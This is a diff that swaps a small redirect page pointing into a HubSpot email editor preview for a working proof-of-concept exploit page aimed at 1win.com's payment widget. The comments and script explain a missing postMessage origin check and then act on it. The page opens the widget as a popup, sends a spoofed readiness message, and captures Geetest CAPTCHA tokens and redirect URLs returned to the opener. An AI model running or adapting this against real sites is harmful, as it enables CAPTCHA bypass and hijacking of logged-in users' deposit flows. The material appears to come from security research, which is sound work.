@@ -1,12 +1,101 @@
-  <!DOCTYPE html>
-  <html>
-  <body>
-  <button onclick="go()" style="font-size:24px;padding:20px">Click to Continue</button>
-  <script>
-  function go() {
-    window.open('https://146256700.hubspotpreview-eu1.com/_hcms/preview/content/385568868585?benderPackage=LayoutBuilderUI&cacheBust=1774968218098&cssPath=bundles%2Fapp.css&inpageEditorUI=true&localAssets=false&portalId=146256700&preview_key=rEFNuxqW&scriptPath=bundles%2Fapp-dnd.js&staticVersion=static-3.59551&injectedScripts=head-dlb%2Cbundle.production.js%2Cfalse%2Cstatic-1.4841&injectedScripts=hubspot-dlb%2Cbundle.production.js%2Cfalse%2Cstatic-2.1806&injectedScripts=react-dlb%2Cbundle.production.js%2Cfalse%2Cstatic-1.73&injectedScripts=tinymce-dlb%2Cbundle.production.js%2Cfalse%2Cstatic-1.71&injectedScripts=LayoutBuilderUI%2CLayoutBuilderUI-lang-en.js%2Cfalse%2Cstatic-3.59551%2Cdefer&_preview=true&env=prod&hublet=eu1&hsEditorApp=email&sessionId=c4353b47-35da-400', '_blank');
-    window.location.href = 'https://app-eu1.hubspot.com/email/146256700/edit/385568868585/content';
+<!DOCTYPE html>
+<!--
+  PoC 1: __WIDGET_REDIRECT_FORM_READY__ No-Origin-Check → Deposit Flow Hijack
+
+  VULNERABILITY: Ch() in /paywidget/assets/index-CCDnOddw.js listens for
+  "__WIDGET_REDIRECT_FORM_READY__" with NO origin check.
+
+  FLOW:
+    1. Attacker opens paywidget as popup (becomes window.opener)
+    2. Attacker sends __WIDGET_REDIRECT_FORM_READY__ to paywidget
+    3. Ch() resolves — paywidget thinks parent is ready, unblocks deposit creation
+    4. Paywidget sends geetestResult back to window.opener (attacker) with targetOrigin="*"
+    5. Attacker harvests Geetest CAPTCHA token
+
+  REQUIRES: Victim is logged into 1win.com (cookies present)
+  IMPACT: CAPTCHA bypass tokens harvested, deposit flow unblocked by untrusted party
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>PoC 1 - WIDGET_READY Spoof + Geetest Harvest</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    h2 { color: #ff0; }
+    #log { background: #000; border: 1px solid #0f0; padding: 10px; height: 400px; overflow-y: auto; }
+    .evt { color: #0ff; } .warn { color: #ff0; } .hit { color: #f00; font-weight: bold; }
+    button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px 16px; cursor: pointer; margin: 4px; }
+  </style>
+</head>
+<body>
+  <h2>PoC 1 — __WIDGET_REDIRECT_FORM_READY__ No-Origin-Check</h2>
+  <p>Target: <code>https://1win.com/paywidget/form</code></p>
+  <button onclick="runPoC()">Run PoC</button>
+  <button onclick="clearLog()">Clear</button>
+  <div id="log"></div>
+
+<script>
+const TARGET = 'https://1win.com';
+const WIDGET_READY = '__WIDGET_REDIRECT_FORM_READY__';
+let paywidgetWindow = null;
+
+function log(msg, cls = '') {
+  const d = document.getElementById('log');
+  const ts = new Date().toISOString().slice(11, 23);
+  d.innerHTML += `<div class="${cls}">[${ts}] ${msg}</div>`;
+  d.scrollTop = d.scrollHeight;
+}
+
+// Listen for ALL messages from any origin (including the paywidget)
+window.addEventListener('message', function(e) {
+  log(`RECEIVED message from origin: <b>${e.origin}</b>`, 'evt');
+  log(`  data: ${JSON.stringify(e.data)}`, 'evt');
+
+  // This is what we're after: paywidget sends geetestResult to opener (us) with NO targetOrigin
+  if (e.data && e.data.type === 'geetestResult') {
+    log(`[!!! HIT !!!] Geetest token captured from ${e.origin}`, 'hit');
+    log(`  payload: ${JSON.stringify(e.data.payload)}`, 'hit');
   }
-  </script>
-  </body>
-  </html>
+
+  // Also catch any redirect messages leaking from paywidget
+  if (e.data && e.data.type === 'redirect') {
+    log(`[!!! HIT !!!] Redirect URL captured: ${e.data.payload?.url}`, 'hit');
+  }
+});
+
+function runPoC() {
+  log('Opening paywidget as popup (attacker becomes window.opener)...', 'warn');
+
+  // Open the paywidget popup — attacker's page IS window.opener
+  // Adjust URL params as needed (method name, locale etc)
+  paywidgetWindow = window.open(
+    TARGET + '/paywidget/form',
+    'paywidget',
+    'width=500,height=700,left=100,top=100'
+  );
+
+  if (!paywidgetWindow) {
+    log('Popup blocked! Allow popups for this page.', 'warn');
+    return;
+  }
+
+  log('Popup opened. Waiting 3s for paywidget to load...', 'warn');
+
+  // Give paywidget time to set up its Ch() listener
+  setTimeout(() => {
+    log(`Sending spoofed "${WIDGET_READY}" to paywidget with targetOrigin="*"...`, 'warn');
+
+    // Ch() in paywidget has NO origin check — any sender works
+    paywidgetWindow.postMessage(WIDGET_READY, '*');
+
+    log('Message sent! Waiting for paywidget to send geetestResult back to us (window.opener)...', 'warn');
+    log('(paywidget uses window.opener.postMessage with no targetOrigin)', 'warn');
+  }, 3000);
+}
+
+function clearLog() {
+  document.getElementById('log').innerHTML = '';
+}
+</script>
+</body>
+</html>
